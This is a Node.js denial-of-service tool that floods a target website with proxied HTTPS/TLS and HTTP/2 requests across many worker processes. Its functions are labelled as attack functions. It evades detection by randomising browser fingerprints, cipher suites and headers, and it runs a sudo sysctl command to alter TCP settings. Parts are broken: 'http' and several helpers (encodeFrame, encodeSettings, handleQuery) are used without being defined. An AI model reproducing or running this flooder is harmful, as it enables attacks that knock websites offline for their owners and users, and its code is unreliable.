const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2-wrapper');
const path = require('path');
const randstr = require('randomstring');

// Common configuration
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
];

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES"
];

// Helper functions
function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);
    if (option === undefined) return false;

    const optionValue = option.value;
    if (optionValue === "true" || optionValue === true) return true;
    if (optionValue === "false" || optionValue === false) return false;
    if (!isNaN(optionValue)) return parseInt(optionValue);
    if (typeof optionValue === 'string') return optionValue;
    return false;
}

function ra() {
    return randstr.generate({
        charset: "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        length: 4
    });
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

// Main attack functions
async function tlsAttack(proxy, target, reqmethod, rate, randomparam, COOKIES, POSTDATA, headerbuilders) {
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];
    const [proxyHost, proxyPort] = proxy.split(':');
    const parsed = new URL(target);

    return new Promise((resolve) => {
        const req = http.request({ 
            host: proxyHost,
            port: proxyPort,
            ciphers: cipper,
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            resolve();
        });

        req.on('connect', (res, socket, head) => { 
            const tlsConnection = tls.connect({
                host: parsed.host,
                ciphers: cipper,
                secureProtocol: 'TLSv1_2_method',
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, () => {
                for (let j = 0; j < rate; j++) {
                    let path = parsed.path;
                    if (randomparam) {
                        path = `${path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`;
                    } else {
                        path = path.replace("%RAND%",ra());
                    }

                    let request = `${reqmethod} ${path} HTTP/1.1\r\nHost: ${parsed.host}\r\nReferer: ${target}\r\nOrigin: ${target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ${UAs[Math.floor(Math.random() * UAs.length)]}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: ${COOKIES}\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive`;

                    if (headerbuilders) {
                        request += headerbuilders.replace("%RAND%",ra());
                    }

                    request += '\r\n\r\n';

                    if (reqmethod.toUpperCase() === 'POST' && POSTDATA) {
                        request += POSTDATA.replace("%RAND%",ra()) + '\r\n\r\n';
                    }

                    tlsConnection.write(request);
                }
            });

            tlsConnection.on('error', () => {
                tlsConnection.end();
                tlsConnection.destroy();
                resolve();
            });

            tlsConnection.on('data', () => {});
        });

        req.end();
    });
}

async function http2Attack(proxy, target, reqmethod, rate, options) {
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const url = new URL(target);
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];
    const [proxyHost, proxyPort] = proxy.split(':');

    return new Promise((resolve) => {
        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    ciphers: cipper,
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | 
                                  crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | 
                                  crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                    secure: true,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false
                }, () => {
                    if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return resolve();
                    }

                    let streamId = 1;
                    let hpack = new HPACK();
                    hpack.setTableSize(4096);

                    const updateWindow = Buffer.alloc(4).writeUInt32BE(15663105, 0);
                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([[1, 262144], [2, 0], [4, 6291456], [6, 65536]])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.write(Buffer.concat(frames));

                    function doWrite() {
                        if (tlsSocket.destroyed) return;

                        const requests = [];
                        const customHeadersArray = [];
                        
                        if (options.customHeaders) {
                            const customHeadersList = options.customHeaders.split('#');
                            for (const header of customHeadersList) {
                                const [name, value] = header.split(':');
                                if (name && value) {
                                    customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                                }
                            }
                        }

                        for (let i = 0; i < rate; i++) {
                            const browserVersion = getRandomInt(120, 123);
                            const fwfw = ['Google Chrome', 'Brave'];
                            const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                            const ref = ["same-site", "same-origin", "cross-site"];
                            const ref1 = ref[Math.floor(Math.random() * ref.length)];

                            let brandValue;
                            if (browserVersion === 120) {
                                brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 121) {
                                brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 122) {
                                brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 132) {
                                brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                            }

                            const headers = Object.entries({
                                ":method": reqmethod,
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": options.query ? handleQuery(options.query) : url.pathname + (options.postdata ? `?${options.postdata}` : ""),
                            }).concat(Object.entries({
                                "sec-ch-ua": brandValue,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": `\"Windows\"`,
                                "upgrade-insecure-requests": "1",
                                "user-agent": UAs[Math.floor(Math.random() * UAs.length)],
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "sec-fetch-site": options.refererValue ? ref1 : "none",
                                "sec-fetch-mode": "navigate",
                                "sec-fetch-user": "?1",
                                "sec-fetch-dest": "document",
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": "en-US,en;q=0.9",
                                ...(options.hcookie && { "cookie": options.hcookie }),
                                ...(options.refererValue && { "referer": options.refererValue === 'rand' ? 'https://' + generateRandomString(6, 6) + ".net" : options.refererValue }),
                                ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                            }).filter(a => a[1] != null));

                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(headers)
                            ]);

                            requests.push(encodeFrame(streamId, 1, packed, 0x25));
                            streamId += 2;
                        }

                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                setTimeout(doWrite, 1000 / rate);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                                resolve();
                            }
                        });
                    }

                    doWrite();
                }).on('error', () => {
                    tlsSocket.destroy();
                    resolve();
                });
            });

            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }).once('error', () => resolve()).once('close', () => resolve());
    });
}

// Main execution
if (cluster.isMaster) {
    // Parse command line arguments
    if (process.argv.length < 6) {
        console.log('Usage:');
        console.log('For TLS mode: node combined.js <MODE> <host> <proxies> <duration> <rate> <threads> [options]');
        console.log('For HTTP/2 mode: node combined.js <MODE> <host> <duration> <threads> <rate> <proxies> [--http2] [options]');
        process.exit(0);
    }

    const isHttp2 = process.argv.includes('--http2');
    const reqmethod = process.argv[2].toUpperCase();
    const target = process.argv[3];
    const time = parseInt(process.argv[4]);
    const threads = parseInt(process.argv[5]);
    const rate = parseInt(process.argv[6]);
    const proxyfile = process.argv[7];

    // Parse options
    let COOKIES, POSTDATA, randomparam, headerbuilders;
    process.argv.forEach((ss) => {
        if (ss.includes("cookie=")) COOKIES = ss.slice(7);
        if (ss.includes("postdata=") && reqmethod === "POST") POSTDATA = ss.slice(9);
        if (ss.includes("randomstring=")) randomparam = ss.slice(13);
        if (ss.includes("headerdata=")) {
            headerbuilders = "";
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders += `\r\n${head}: ${dat}`;
            }
        }
    });

    const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

    console.log(`Master PID: ${process.pid}`);
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        console.log(`Thread ${i} Started, PID: ${worker.process.pid}`);
    }

    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    // Worker process
    const isHttp2 = process.argv.includes('--http2');
    const reqmethod = process.argv[2].toUpperCase();
    const target = process.argv[3];
    const time = parseInt(process.argv[4]);
    const rate = parseInt(process.argv[6]);
    const proxyfile = process.argv[7];

    // Parse options
    let COOKIES, POSTDATA, randomparam, headerbuilders;
    process.argv.forEach((ss) => {
        if (ss.includes("cookie=")) COOKIES = ss.slice(7);
        if (ss.includes("postdata=") && reqmethod === "POST") POSTDATA = ss.slice(9);
        if (ss.includes("randomstring=")) randomparam = ss.slice(13);
        if (ss.includes("headerdata=")) {
            headerbuilders = "";
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders += `\r\n${head}: ${dat}`;
            }
        }
    });

    const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

    if (isHttp2) {
        // HTTP/2 attack
        const options = {
            query: get_option('--query'),
            hcookie: COOKIES,
            refererValue: get_option('--referer'),
            postdata: POSTDATA,
            customHeaders: get_option('--header')
        };

        setInterval(() => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            http2Attack(proxy, target, reqmethod, rate, options);
        }, 1000 / rate);
    } else {
        // TLS attack
        setInterval(() => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            tlsAttack(proxy, target, reqmethod, rate, randomparam, COOKIES, POSTDATA, headerbuilders);
        }, 1000 / rate);
    }

    setTimeout(() => process.exit(1), time * 1000);
}

// Error handling
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('warning', () => {});
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;